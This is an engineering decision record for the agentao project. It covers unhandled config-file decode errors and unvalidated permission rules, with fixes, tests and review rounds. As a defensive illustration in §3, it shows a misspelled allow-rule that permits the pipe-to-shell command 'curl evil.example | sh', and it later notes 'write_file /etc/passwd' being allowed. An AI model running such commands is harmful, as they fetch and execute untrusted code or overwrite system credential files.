# pi-mono Pull Review (2026-08-10 → 2026-08-20)

**Status:** Decision record, **rev 5 — IMPLEMENTED 2026-08-21** (F2 then F1, in that order; see the implementation note at the end of §4). Drafted 2026-08-21 from 176 commits / 278 files in `../pi-mono` (`936aff009..5cd93f688`), reverse-reviewed, then revised twice by maintainer review: rev 2 rejected rev 1's fix list as incomplete and over-designed (Appendix B); rev 3 fixed two implementation blockers and three factual/contract errors in rev 2's own fix list (Appendix C); rev 4 closed the last policy decision (unknown `action` → reject) and two scope boundaries; rev 5 corrected a layering regression rev 4 had introduced in the validator split. §4 is the route to build.
**Audience:** Agentao maintainers deciding what to port from pi-mono; anyone picking up §4.
**Companion:** `pi-mono-pull-review-2026-08-21.zh.md`.
**Prior art:** `pi-mono-pull-review-2026-08.md`, `pi-mono-borrow-review.md`, `pi-mono-tools-review.md`, `pi-mono-openai-stream-fix.md`. The 2026-08-09 pull (PR #174) lives only in session memory.
**Related:** `permission-hardening-plan.md` — §2 is the missed sibling of a P0 that plan already fixed. `acp-client-audit.zh.md` §239 — the existing precedent for §4's abort route.
**Method:** Categorise the delta → shortlist by the harness-vs-product boundary → probe the **public sink**, not the private helper → reverse-review every surviving claim → maintainer review of the fix list before implementation.

---

## 1. Conclusion

**Zero pi borrows worth landing.** pi's config-diagnostics cluster (`1e1a6e27b`, `913bcf339`, `678f0af30`, `1355cd36e`) only pointed the investigation at agentao's own config-loading path. What came back are two P1 defects that pi does **not** have, both found by reverse review rather than by reading pi.

| # | Defect | Where it bites |
|---|---|---|
| **D1** | `UnicodeDecodeError` subclasses `ValueError`, so the surveyed startup-critical readers do not catch it | CLI startup, `PermissionEngine.__init__`, ACP `session/new`, sub-agent spawn |
| **D2** | Permission rules are never validated — no field check, no type check | `decide_detail()` **mid-turn**, at the first tool call |

Two fix items in §4. Eleven verified not-applicable in §5. The demoted items, the five-row errata from the reverse review, and rev 1's rejected route are in the appendices — the evidence is preserved there so the refuted claims are not re-raised from memory, without a pull review turning into a permission-system redesign.

**Window note.** The trigger question was "today's updates" (2026-08-21). `git fetch origin main` confirmed **no commits dated 2026-08-21**; origin/main's tip is `5cd93f688`, 2026-08-20 15:59. 15 of the 176 commits are `chore: approve contributors`, ~20 are TUI polish, and the largest cluster is a docs rewrite (`harness-v2` deleted, 2941-line `harness.md` + harness-v3 spec written). The harness-level surface in this window is thin.

---

## 2. D1 — Startup-critical config readers do not catch decode failures

`UnicodeDecodeError` subclasses **`ValueError`** — not `OSError`, not `json.JSONDecodeError`. Every reader surveyed below catches only the latter two, so a file that is not valid UTF-8 raises straight through. This is a survey of the startup-critical readers, not a proof about every reader in the tree.

**Scope rule.** 29 first-party modules read JSON with `encoding="utf-8"`. Most read files **agentao itself wrote** (sessions, replay JSONL, goal state, plan controller, memory) — those cannot carry a foreign encoding, and sweeping them would be busywork.

The table below is **the confirmed-affected read sites, selected by startup impact** — not a claim of full coverage over `docs/reference/configuration.md`. Known-omitted, deliberately:

- **Run spec** (`configuration.md` §10). `cli/run.py:193-197` catches only `OSError` on `read_text`, so a UTF-16 spec file bypasses the clean `_UsageError` (exit 2) and surfaces as a raw traceback. Same defect, one `except` clause — omitted only because the degradation is cosmetic, not a startup kill. Its `permissions: {allow, deny}` block **is** in F2's scope, via `add_run_rules()`.
- **Plugin-bundled `.mcp.json`** (rows 4–5) is *not* `.agentao/mcp.json` — different file, different trust class. Listed because it shares the defect, not because it is the same surface.
- **`plugins_config.json`, plugin manifests, hook files** — user-authored JSON, same defect class, not surveyed.

| Config | Read site | `exists`/`is_file` pre-check | Catches `UnicodeDecodeError` |
|---|---|---|---|
| `permissions.json` | `embedding/permission_loader.py:74-76` | **NO** | no |
| | `cli/diagnostics/loaders.py:50-52` | yes | no |
| `mcp.json` | `mcp/config.py:262-266` | yes | no |
| | `embedding/plugins/mcp.py:117-119` | yes | no (warns with path) |
| | `embedding/plugins/manager.py:502-515` | yes | no (warns with path) |
| `settings.json` | `embedding/factory.py:39-43` | yes | no |
| | `cli/app.py:387-391` | yes | no |
| | `replay/config.py:109-114` | yes | no |
| `acp.json` | `acp_client/config.py:41-49` | yes | no — raises raw instead of `AcpConfigError` |
| `skills_config.json` | `skills/manager.py:151-157` | yes | no |

Rev 1 named three of these ten and claimed the problem was governed. It was not: **`cli/app.py:387` runs inside `AgentaoCLI.__init__` (`:287`), before the factory is ever called** — so a UTF-16 `settings.json` kills interactive startup regardless of what the factory does. `cli/diagnostics/loaders.py` — the shared reader behind `agentao doctor` — has the same hole, and it is the one tool a user would reach for to diagnose this.

### Reachability — proven at the public sink

Probed against the constructor, `Path.home` patched to a temp dir holding a UTF-16LE `permissions.json`:

```
PermissionEngine RAISED: UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 0
  File ".../pathlib.py", line 1029, in read_text
```

`load_permission_rules` has **five direct call sites**, so the crash is inherited by every session-construction path — `permissions.py:371`, `embedding/factory.py:181`, `agents/tools/_wrapper.py:559` (sub-agent spawn), `acp/session_new.py:367`, `acp/session_load.py:262`. `cli/diagnostics/collectors.py:101` is a **sixth site that mirrors the loader rather than calling it** — see F1's doctor carve-out, which that duplication makes load-bearing.

### Not a hypothetical encoding

Windows PowerShell 5.1 — still the default shell on stock Windows — writes **UTF-16LE** from `>` and `Out-File`. A GBK-encoded CJK comment inside otherwise-valid JSON does it too (verified: `'utf-8' codec can't decode byte 0xa3`).

### The missed sibling

`permission-hardening-plan.md` §P0 (landed 2026-05-04) found and fixed **exactly this class** one line lower:

> `data.get("rules", [])` inside a `try/except (IOError, json.JSONDecodeError)` that does **not** catch `AttributeError`. Valid JSON whose top level is a list, string, or null crashes engine init.

That fix — the `isinstance(data, dict)` guard now at `permission_loader.py:78` — handles the *parsed-shape* failure. The *decode* failure happens one line **earlier**, on `path.read_text(encoding="utf-8")`, and was missed.

---

## 3. D2 — Permission rules are never validated

`PermissionEngine` reads exactly four keys off a rule — `tool`, `action`, `args`, `domain` (`permissions.py:498,508,512,527`). There is no validation between the file (or the host's `rules=` kwarg) and the engine: unknown fields are silently ignored, and **no type is ever checked**.

Rev 1 called this "unknown-key checking" and stopped there. Measured, the type gaps are the larger half — and none of them surface at startup. They surface at `runtime/tool_planning.py:494`, which calls `decide_detail()` with **no `try`/`except` around it**, i.e. **mid-turn, at the first tool call**:

| Malformed rule | Result |
|---|---|
| rule is not an object | `AttributeError: 'str' object has no attribute 'get'` |
| `action` is not a string | `AttributeError: 'int' object has no attribute 'lower'` |
| `args` is not an object | `AttributeError: 'str' object has no attribute 'items'` |
| `domain` is not an object | `AttributeError: 'str' object has no attribute 'get'` |
| `tool` is not a string | `TypeError: first argument must be string or compiled pattern` |
| `args` **value** is not a string | `TypeError: first argument must be string or compiled pattern` |
| `domain.allowlist` is a string, not a list | **no error — a `deny` rule silently degrades to ASK** |

The field half is a security problem in its own right. An `allow` rule whose condition key is misspelled loses the condition and widens to the entire tool:

```
{"tool":"run_shell_command","pattern":"^git ","action":"allow"}    # typo: should be "args"

  git status                -> ALLOW    (intended)
  curl evil.example | sh    -> ALLOW    (the correct rule gives ASK)

  /permissions renders it as:   1. [✓ ALLOW] run_shell_command
```

A one-word key typo is a **silent privilege escalation** displayed as an ordinary allow-rule. Two neighbours confirm the same no-validation shape: `{"tools": "write_file", …}` falls back to `rule.get("tool", "*")` and **denies every tool**; `{"action": "alow"}` falls through to ASK and renders verbatim as `[? ALOW]`.

**Scope.** Not confined to the file path — `PermissionEngine(rules=[...])` and `add_run_rules(allow=, deny=)` (`permissions.py:388`) take raw rule dicts through the same unvalidated door, and `agentao.host` exists precisely so hosts can set policy.

**Not already recorded.** `permission-hardening-plan.md` §10 carries five open follow-ups; rule validation is not among them.

---

## 4. Fix list

**F1 and F2 are not independent.** Rev 2 claimed they were and simultaneously required F2's validation errors to arrive as F1's file-scoped config error — which the current data flow cannot deliver: `load_permission_rules` returns bare rule dicts, so a validator living in the engine can neither tell a file-sourced rule from a host-supplied one nor recover the path. (`loaded_sources` carries a formatted `"user:<path>"` label, not a structured path, and is absent when a host passes `rules=` directly.)

The split that makes both implementable:

| Layer | Responsibility |
|---|---|
| `permissions.py::validate_permission_rules(rules)` | A **pure rule-list validator** — checks that `rules` is a list, then each rule's fields + types. Returns structured errors **`(index: int \| None, reason)`**; `index=None` means the *collection* is not a list, the only failure with no rule ordinal. No I/O, no path knowledge, and **no notion of a JSON document** — the engine is never handed one. |
| `permission_loader.py` | Owns everything document-shaped: checks the top level is an object, reads `data.get("rules", [])`, calls the validator, and wraps both its own document-level failures and the validator's rule-level ones as `PermissionConfigError(path, …)`. The only layer that knows the path. |
| `PermissionEngine(rules=…)` / `add_run_rules()` | Call the same validator directly and raise a plain rule-validation error — no path, because there is no file. |

Rev 4 briefly folded the document-is-an-object check into the pure validator. That was a layering regression of rev 4's own making: the engine receives a rule *list*, never a document, so a shared function covering both would need a mode flag or polymorphic input to serve two callers that do not have the same input. Document shape belongs to the only layer that reads documents.

**Land them together, or land F2 first as F1's dependency.** F1 alone cannot produce the error message §4's three-state table promises.

### F1 — Config encoding, with a three-state contract

**Prerequisite, not an extra.** `embedding/permission_loader.py` is the only reader in §2's table with **no `is_file()` pre-check** — a missing file currently returns empty via the `OSError` branch. Add the pre-check *first*. Without it, the abort route below would make agentao refuse to start for every user who has no `permissions.json`, which is the common case.

**Do not invent a shape — `cli/diagnostics/loaders.py:40-62` already has the right one** and is the reference to converge on: it distinguishes `absent` / `unreadable` / `malformed` and returns the path in the message. `embedding/plugins/mcp.py:117` and `manager.py:502` already warn with the path too.

1. **Read with `encoding="utf-8-sig"`** at every site in §2's table. Python's codec strips a leading BOM and is a byte-for-byte no-op without one, so a BOM'd-but-otherwise-valid file loads instead of being discarded. **Reads only** — `utf-8-sig` on a *write* emits a BOM.
2. **Catch `UnicodeDecodeError`** alongside the existing types. Prefer the explicit `(OSError, UnicodeDecodeError, json.JSONDecodeError)` over `(OSError, ValueError)`: `json.JSONDecodeError` already subclasses `ValueError`, so the broad form would swallow unrelated `ValueError`s.
3. **Three states, by file class:**

   | State | `settings.json`, `mcp.json`, `skills_config.json` | `permissions.json` |
   |---|---|---|
   | absent | silent, empty | silent, empty |
   | unreadable / decode failure / invalid JSON | warn with the path, fall back to empty | **raise a config error naming the path; abort session creation** |
   | fails schema validation | *not in scope — no validator exists for these files* | **raise `PermissionConfigError` (F2)** |

   The second row is deliberately narrower than rev 3's "fails validation": F2 builds a validator for permission rules only, and promising validation semantics for files that have no validator would silently widen this route into a config-system rewrite.

   **Known, out of scope, recorded so it is not lost:** the other configs have the *same* uncaught-exception-type defect one level up, in shape rather than encoding. A top-level-list `mcp.json` raises an uncaught `AttributeError: 'list' object has no attribute 'get'` out of `load_mcp_config` (probed), and `skills/manager.py::_load_config` has no `isinstance` guard either. `embedding/factory.py:41` *is* guarded. This is the same family as the P0 `permission-hardening-plan.md` fixed for `permissions.json` — a separate, cheap follow-up, not part of F1. **Superseded by the post-implementation review** (see the section after the implementation note): deferring it left F1's own new `configuration.md` row untrue, so the guards were landed with F1 after all. The reasoning above is kept as the decision that was actually made at design time.

   **Carve-out — the diagnostic path must not abort.** The row above is the *runtime* loader. `agentao doctor` (and any future `config validate`) must **catch** the same failure, turn it into an error-level Finding, and finish the report: the moment a user most needs diagnostics is exactly when their config is broken, so a doctor that exits early is worse than useless.

   Today this is not yet a live conflict — `collectors.py:101::_collect_permissions` *mirrors* `load_permission_rules` rather than calling it, and already distinguishes missing from malformed. That duplication is the risk, not the safety: when F1 changes the runtime behaviour, the mirror silently keeps reporting "being silently ignored" while the runtime now aborts. **The mirror must be updated in the same change**, and its message must describe the new behaviour.

   Rev 1 said "keep swallowing; only the silence is wrong." That contradicted this document's own §3 and Appendix A evidence: once permission rules disappear, an `mcp_*` deny returns `None` from the engine, falls to tier 3, and a `trust: true` server's tool (`requires_confirmation=False`) executes with **no prompt**. A log does not close that. The maintainer review's route — fail closed on the policy file, warn-and-degrade on the rest — does.

   This is not a new convention: `acp_client/config.py:48-49` already does exactly this for `acp.json` (`raise AcpConfigError(f"invalid JSON in {config_path}: {exc}")`), recorded as a deliberate strictness choice in `acp-client-audit.zh.md` §239. F1 applies an existing agentao convention to the file that most needs it — and incidentally fixes `acp.json`'s own decode hole, where a UTF-16 file bypasses `AcpConfigError` and surfaces as a raw traceback.

**Blast radius — this is a documented-contract change, not just a behaviour change.** Anyone whose `permissions.json` is *already* malformed and has not noticed goes from silent degradation to a startup abort. Three things must move with it:

- **`tests/test_permissions_modes.py:280::test_invalid_json_user_config_graceful_fallback`** asserts `# should not raise` and `e.rules == []`. It must be inverted and becomes the breaking-change acceptance test. (Rev 2 claimed no test depended on the current behaviour — **wrong**; the grep that produced that claim searched for "malformed/corrupt" and the test is named "invalid_json".) `test_stray_project_config_does_not_raise` at `:288` is **unaffected**: it passes `user_root=None`, and the project file is never a rule source.
- **`docs/reference/configuration.md:130`** states the contract this fix breaks — *"Missing file or malformed JSON → empty rule list (no startup error)"*. That line also names a **stale loader** (`permissions.py::PermissionEngine._load_file`); the loader moved to `embedding/permission_loader.py`. Fix both in the same pass.
- **`docs/reference/configuration.md:85`** — settings.json's *"silently treated as `{}`"* survives the no-startup-error half but loses the "silently"; update the wording.

**Tests:** build inputs from real byte sequences, not hand-authored strings that restate the belief — `b"\xef\xbb\xbf" + body.encode()`, `codecs.BOM_UTF16_LE + body.encode("utf-16-le")`, a genuine trailing-comma document. Assert: absent → silent; BOM → **loads**; UTF-16 → typed error naming the path (policy file) or warning naming the path (the rest). Counterfactual each clause separately.

### F2 — One rule validator, uniform rejection

A single small validator, complete over fields **and** types, shared by **three** callers: `permission_loader.py` (file path), `PermissionEngine.__init__` (`rules=`), and `add_run_rules()`.

- **Fields:** the legal key set is closed and small — `tool`, `action`, `args`, `domain` (with `domain` carrying `url_arg` / `allowlist` / `blocklist`). Anything else is invalid.
- **Types:** rule is an object; `tool` a string; `action` a string that `.lower()`s into one of `_ACTION_TO_DECISION`'s three keys (`allow` / `deny` / `ask`, `permissions.py:31-35`). **Case-sensitivity is not an open decision** — `configuration.md:161` already specifies case-insensitive; validate on `.lower()` and keep that contract; `args` an object of string→string; `domain` an object whose `allowlist` / `blocklist` are lists of strings and whose `url_arg` is a string. This is what closes §3's table, including the `allowlist`-as-string case that silently downgrades a deny.
- **Second documented-contract change — decided, not open.** The same `configuration.md:161` line specifies *"unknown values treated as `ask`"*. **Unknown `action` values are rejected**, consistent with this section's uniform-rejection rule; the `ask` fallback is *not* retained, because it is what leaves `{"action":"alow"}` silently inert (§3). Rewrite that half of the line and note it in the changelog, exactly as for F1's contract changes.
- **Uniform rejection.** Any invalid rule is rejected and reported with **source path / rule index / reason** (path only where a file exists — see the layer table above). No `allow`-vs-`deny` asymmetry: rev 1 proposed keeping invalid deny rules as "fail-closed and therefore safe", which its own evidence refutes — the `{"tools": …}` typo widens a single-tool deny into a **deny-all**, which is not a state worth preserving.
- **No display-layer change.** Rev 1 needed `get_rules_display()` to mark rules whose condition had been discarded, which in turn needed a rejected-rules side-table. Rejecting at construction removes the need for both: the display never sees an invalid rule.
- **Where the error lands:** per the layer table — file-sourced rules become `PermissionConfigError(path, index, reason)` in the loader; host-supplied rules (`rules=`, `add_run_rules()`, and the run spec's `permissions: {allow, deny}`) raise a plain rule-validation error at the call. With the policy file failing closed, uniform rejection has no silent-downgrade hole to fall into.

**Side effect worth naming:** this also removes the mid-turn `AttributeError` / `TypeError` at `tool_planning.py:494`. Today a malformed rule survives construction and detonates on the permission hot path at the first tool call, after the user has already spent a turn.

**Files:** `agentao/permissions.py` (validator + the `rules=` and `add_run_rules()` call sites), `agentao/embedding/permission_loader.py` (calls the validator and wraps failures as `PermissionConfigError`).

### Implementation note (2026-08-21)

Landed F2 first, then F1, per the layer table. Full suite **3984 passed, 1
skipped**; `ruff check .` clean.

| Where | What |
|---|---|
| `permissions.py` | `validate_permission_rules(rules)` (pure, public), `PermissionRuleError`, `format_permission_rule_errors`. Wired into `PermissionEngine.__init__(rules=)` and `add_run_rules()` |
| `embedding/permission_loader.py` | `PermissionConfigError(path, reason, errors=)`; `is_file()` pre-check; `utf-8-sig`; document shape + `data.get("rules", [])` + path wrapping |
| 8 other read sites | `utf-8-sig` + explicit `UnicodeDecodeError`, warn-with-path where they previously swallowed in silence |
| `cli/diagnostics/collectors.py` | The mirror updated in the same change: runs the same validator, reports every failure as a Finding, never aborts |
| `tests/test_config_encoding.py` (23), `tests/test_permission_rule_validation.py` (44) | New |
| `tests/test_permissions_modes.py` | `test_invalid_json_user_config_graceful_fallback` → `test_invalid_json_user_config_fails_closed` |
| `docs/reference/configuration.{md,zh.md}` | §3/§4/§5/§6/§7 failure modes; the stale `PermissionEngine._load_file` loader name; both halves of the `action` row; the closed key set |

Four things the design did not specify, decided during implementation:

1. **`add_run_rules` validates `deny` and `allow` separately**, labelling errors `permissions.deny[i]` / `permissions.allow[i]` so an index maps back to the block the spec author wrote. Both run **before** either list is applied — a partially-installed run policy is worse than none.
2. **A decode failure is `malformed`, not `unreadable`, in `cli/diagnostics/loaders.py`.** That module's `FileStatus` splits filesystem errors from content errors; bytes that will not decode are content.
3. **All four built-in presets are asserted to pass the validator** — it has to accept the rules agentao ships itself.
4. **`PermissionRuleError` and `PermissionConfigError` are separate types**, not a subclass pair: the latter also covers failures reached before rule validation (decode, invalid JSON, non-object document).

Still open, as scoped: the run spec's own file read (`cli/run.py:193`, cosmetic — its `permissions:` block *is* covered via `add_run_rules`); plugin manifests and hook files; and a console/stderr handler policy for library-module warnings (see below).

### Post-implementation review (2026-08-21)

A `/code-review --fix` pass over the diff found **10 correctness defects, all fixed**; suite 3991. Four of them were security-relevant and two of those were *this change's own doing*:

1. **The document key set was not closed** — `{"rule": [...]}` parsed, `data.get("rules", [])` returned `[]`, every rule was dropped, and `active_permissions()` still listed the file as loaded. A silent fail-**open** in the one loader written to fail closed. Now an unknown top-level key raises; `{}` stays a valid empty policy.
2. **`tool` and `action` were not checked for *presence*.** §4 above specified types and a closed key set, and I built exactly that — but `{"action": "allow"}` has no unknown key to catch, so it sailed through the new validator and became allow-everything via `rule.get("tool", "*")` (measured: `write_file /etc/passwd` → ALLOW). A closed key set does not close the widening hole on its own. Both are now required, which restores rather than changes the contract — `configuration.md` §4's field table already marked them `required: yes`.
3. **`add_run_rules()` began raising and its `cli/run.py` call site was unguarded** — a bad spec `permissions:` block escaped as a traceback instead of the documented `invalid_spec` envelope / exit 2.
4. **Three of my own new warn-and-degrade sites still crashed on a non-object file** (`mcp.json`, `cli/app.py` `settings.json`, `skills_config.json`), and the `cli/app.py` warning interpolated an unescaped path into Rich markup — a warn path that could itself raise `MarkupError`.

Plus: the doctor mirror missed both the document-key check and the "will not start" finding for the invalid-rule case; `plugins_config.json` had the identical `UnicodeDecodeError` hole 70 lines above a site this diff *did* fix.

**Two scope decisions the review made that §4 had explicitly deferred**, kept because leaving them would have made this change's own new documentation false: the `isinstance(data, dict)` guards for `mcp.json` / `settings.json` / `skills_config.json` (F1 §3 called them "a separate, cheap follow-up"), and the `plugins_config.json` encoding fix (§2 listed it unsurveyed). Both are one-liners, neither builds a validator, and without them the "→ a warning, then the default" row this change added to `configuration.md` was untrue.

**Deliberately not fixed:** library-module warnings reach the terminal only via Python's `lastResort`, i.e. only while no handler is attached. In practice the `settings.json` reads are visible and `mcp.json` / `skills_config.json` land in `agentao.log`. Giving `agentao`'s logger a console handler is a handler-policy decision that does not belong in this diff; the docs were narrowed to say what actually happens instead. Two reuse/altitude findings (a shared encoding-hint constant, generalizing `_load_json_object` into the one config reader) were also declined: their correct home crosses the `core → embedding` direction PR #175's guard polices, so they need a layering decision, not a move.

### Codex review (2026-08-21, after the fix pass)

A second, independent reviewer over the same diff. **2 findings, both P2, both fixed** (suite 4000):

1. **The run-spec permission check sat after `build_from_environment()`.** The first review round moved it from "traceback" to "`invalid_spec` envelope", but left it downstream of construction — so any unrelated construction failure reported first and turned exit 2 back into exit 1, and even on the success path the whole runtime plus its on-disk side effects were built before rejecting input that was invalid from the start. Now validated beside the other spec checks in `_execute_run`, before any runtime exists; both sites share one `_spec_engine_rules()` converter so they cannot drift, and the post-construction handler is now an explicit backstop.
2. **The new error text could crash the code that displays it.** Validation quotes the offending key verbatim, so a rule field named `[/oops]` reached Rich as markup. The first review pass escaped `cli/app.py` — but not the two boundaries that render *this* error: the interactive `Fatal error:` handler and `agentao doctor`'s `_render_human`. Both raise `MarkupError` instead of the typed error / finished report. Every dynamic value at both is now escaped (paths, env values, exception text, Finding messages), and the fatal-handler test drives `main()` rather than re-printing its format string.

**Both are second-order defects of the first review's own fixes** — the pattern is now three deep: F2's spec → the fix that closed it → the fix for *that* fix. What made the difference each time was a *different* reviewer, not a more careful pass by the same one.

**The lesson, distinct from the five review rounds':** the fix list was reviewed five times and still shipped a fail-open and a privilege escalation. Both came from implementing the specification *exactly* — a closed key set and type checks — without re-asking what the specification was **for**. Rev 1's lesson was to re-verify reachability for the remedy; this one is to re-verify the remedy's **completeness against the threat**, not against its own wording.

---

## 5. Not applicable — verified

| pi change | agentao status | Query / evidence |
|---|---|---|
| `90305d90a` disable tools during summarization | **Both halves at parity** | `context_manager.py:593` already passes `tools=None`; empty-response half handled at `:413-415` |
| `5093641a5` Google length stop overwritten by `toolUse` | Structurally impossible | agentao never synthesises `finish_reason` from tool-call presence. Verified in code: `_runner.py:443-452` → `_handle_length_truncated_tool_calls` refuses to execute. `_LENGTH_FINISH_REASONS` matched case-insensitively (`:41,53-57`), so Gemini's `MAX_TOKENS` hits |
| `541045ae0` `defaultTools` clobbering extension tools | At parity | `tooling/registry.py:212-218` skips `mcp_*`, plan-only and `extra_tools`; documented in `host-tool-allowlist.md` |
| `2ff8ba622` keep `/model` `/thinking` session-scoped | Never had the bug | `grep "settings.json" agentao/cli/commands/provider.py` → 0 hits |
| `ca21c1686` single-edit-input coercion | No such shape | `EditTool.execute(file_path, old_text, new_text, replace_all)` — flat scalars. agentao generalises this class in `runtime/arg_repair.py`; pi has no equivalent layer |
| `8c2529dae` don't load root `.md` as skills | Structurally impossible | agentao discovers `skills/<name>/SKILL.md` subdirs only |
| `5e11f6586` nested markdown skills | pi package-manager specific | No agentao analogue |
| `98145a6c0` empty Bedrock tool-argument keys | Bedrock Converse serialization | agentao is OpenAI-compat only |
| `8af7690c4` / `e3798ca91` subagent trust + config inheritance | Out of scope, already recorded | Both land in `examples/extensions/subagent/index.ts`, not pi core. See `agent-definition-trust-line.zh.md` and `openworker-borrow-review.zh.md` §1 |
| `b7bb00b93` / `4ca636c5e` reasoning-detail round-trip | Adjacent, opposite axis | pi fixes forwarding *within* a session; PR #177 purges *across* a switch. agentao forwards via `model_dump()` |
| `df018b602` `7d8c11d37` `b3edf0170` `086c32e74` | No analogue | pi's model-catalog / Copilot-login machinery; agentao has no model catalog |

**Decision, not a recommendation.** The delta's largest cluster is a docs rewrite — `harness-v2.md` (4612 lines) and two companions deleted, `harness.md` (2941 lines) plus a harness-v3 storage/runtime redesign written. Same disposition as the 2026-08 review gave lanes and durable operations: a proposal to be aware of, not a slice that can be taken.

---

## Appendix A — Demoted items and errata

Kept so refuted claims are not re-raised from memory.

### A1. Malformed / BOM config drops every rule (P2 — folded into F1)

Measured at `load_permission_rules(project_root=…, user_root=<home>/.agentao)`:

```
plain   -> rules=[{'tool': 'run_shell_command', ...}]  sources_len=1
bom     -> rules=[]                                    sources_len=0
comma   -> rules=[]                                    sources_len=0
```

Same for `mcp.json` and `settings.json`. This is the second independent peer data point on the open hermes 7/9 item ("warn on malformed permissions.json"); pi shipped the two halves that item did not specify — the path in the message, and startup surfacing. F1 subsumes it.

**"Fail-open" is too strong**, and the precise shape is what justifies F1's asymmetric treatment of `permissions.json`:

| tool call | rules loaded | rules dropped |
|---|---|---|
| `run_shell_command` `ls -la` | ALLOW | ALLOW |
| `run_shell_command` `git push …` (user deny) | DENY | **ASK** |
| `run_shell_command` `rm -rf build` | DENY | DENY — preset `permissions.py:249`, independent of user rules **and** of the hardline scanner |
| `mcp_github_create_issue` (user deny) | DENY | **None** → tier 3 → `trust:true` tool runs unprompted |

### A2. Compaction failure signalling (P3 — not scheduled)

`_maybe_full_compress` emits `CONTEXT_COMPRESSED` **unconditionally** — failure path included, and after the circuit breaker opens — shaped as a success (`pre_msgs == post_msgs`, no `ok`/`error` field). A host can only infer failure by comparing counts. No CLI consumer prints it (`grep CONTEXT_COMPRESSED agentao/cli/` → 0 hits), so the auto path is silent to the user while manual `/compact` correctly reports "produced nothing" (`cli/commands/compact.py::_produced_fresh_compaction`). pi's `a6b1dbceb` is the right shape — a distinguishable `compaction_failed`.

### A3. Errata — five first-pass errors

| # | Claim | Correction |
|---|---|---|
| 1 | A deny rule in `.agentao/permissions.json` silently vanishes | Wrong file. Project scope is **deliberately unhonored** and already warns (`permission_loader.py:52-61`); only `<home>/.agentao/permissions.json` is a source |
| 2 | Dropping rules is fail-open | Too strong. DENY→**ASK** for shell/web; `rm -rf` still DENY via preset. Genuine silent fail-open only for `mcp_*` |
| 3 | Windows editors emit BOM by default | Over-asserted for 2026. The load-bearing case is PowerShell 5.1's UTF-16LE |
| 4 | No compaction event on the host contract | Wrong. `CONTEXT_COMPRESSED` exists on `transport/events.py:36`, emitted `replay/observability.py:47`, recorded `adapter.py:411` |
| 5 | Context grows unbounded after the breaker opens | Wrong. `microcompact_messages` is non-LLM (`context_manager.py:282-289`) and independent of `_consecutive_compact_failures` |

### A4. Process notes

**Error 2 came from a hand-authored fixture that restated the belief.** The probe used `{"tool": …, "pattern": …}`; the engine's condition key is `args`. An unrecognised key is silently ignored, so every rule in that fixture widened to a tool-wide match and the "rules loaded" column was an artifact. The fixture bug and D2 are the same fact from two sides — the reviewer typo'd a permission rule, the engine accepted it silently, and only a contradictory measurement (`ls -la → DENY`) exposed it. That is the strongest available argument for F2: the failure mode caught its own reviewer.

**Errors 4 and 5 share one cause** — grepping the module where a contract is *documented* rather than where the event is *emitted*. `agentao/host/` is the public surface; the events are minted in `transport/` and `replay/observability.py`. A "no such event exists" verdict needs the emit-site grep.

## Appendix B — rev 1's rejected fix list

Recorded so the route is not re-proposed. Rev 1 was rejected on five counts, all verified:

1. **F1 named three loaders and claimed governance.** Ten read sites exist across five user-authored configs; the two that matter most for startup — `cli/app.py:387` (runs before the factory) and `cli/diagnostics/loaders.py:50` (behind `agentao doctor`) — were both absent.
2. **"Keep swallowing; only the silence is wrong" contradicted the document's own security finding.** A log does not close the `mcp_*` fail-open.
3. **F2 checked unknown keys only.** Seven type failures were unhandled, six of them raising mid-turn at `tool_planning.py:494`.
4. **Option (c) — drop invalid `allow`, keep invalid `deny` — was internally inconsistent** (the `{"tools": …}` typo makes an invalid deny a deny-all) and required a rejected-rules side-table to keep `get_rules_display()` honest.
5. **The blanket warning would have fired on every normal startup**, because `permission_loader.py` has no `is_file()` pre-check and returns empty for a missing file through the `OSError` branch.

The generalisable lesson: rev 1 verified each *defect* at the public sink but verified the *fix* only against the three files it had already been looking at. Reachability analysis has to be redone for the remedy, not inherited from the diagnosis.

## Appendix C — rev 2's own errors

Rev 2 fixed rev 1's route but introduced five problems of its own. Recorded because two are factual errors in evidence this document had presented as verified.

| # | rev 2 claim | Correction |
|---|---|---|
| 1 | "F1 and F2 are independent; either order" | **Implementation blocker.** F1's promised `path + index + reason` error is undeliverable while the loader returns bare rule dicts. Fixed by §4's layer table |
| 2 | `permissions.json` errors "abort session creation", full stop | **Contract conflict** with the `absent`/`unreadable`/`malformed` model F1 also mandates. The diagnostic path must catch and report, or `agentao doctor` exits exactly when it is needed. Carve-out added, plus the mirror-drift risk in `collectors.py:101` |
| 3 | `action` case-sensitivity is "for the implementer to decide" | **False open question.** `configuration.md:161` already specifies case-insensitive. Also surfaced a second contract change rev 2 had missed — "unknown values treated as `ask`" on the same line |
| 4 | "No test depends on the current behaviour" | **Factually wrong.** `tests/test_permissions_modes.py:280::test_invalid_json_user_config_graceful_fallback` asserts exactly it. The grep behind the claim searched "malformed/corrupt"; the test is named "invalid_json" |
| 5 | Table covers "the files a human hand-edits, listed in `configuration.md`" | **Over-claimed.** Run spec omitted; two rows are plugin-bundled `.mcp.json`, not `.agentao/mcp.json`; `plugins_config.json` / manifests / hooks unsurveyed. Retitled to confirmed-affected-by-startup-impact, with the omissions named |

Also corrected: `load_permission_rules` has **five** direct call sites, not six — `cli/diagnostics/collectors.py` mirrors the loader rather than calling it, which is what makes Appendix C #2 load-bearing rather than academic.

**Lesson, distinct from Appendix B's.** Rev 2's errors are not reachability errors; they are **contract errors**. Every one of #2, #3, #4 is a case of proposing a change without first reading the contract the change breaks — the doctor model, `configuration.md:161`, `configuration.md:130`, and the test that pins it. Rev 1's lesson was "re-verify reachability for the remedy." Rev 2's is: **before changing a behaviour, grep for who documented it and who tests it.** A negative grep is only evidence if it used the vocabulary the codebase actually used — #4 failed on exactly that.
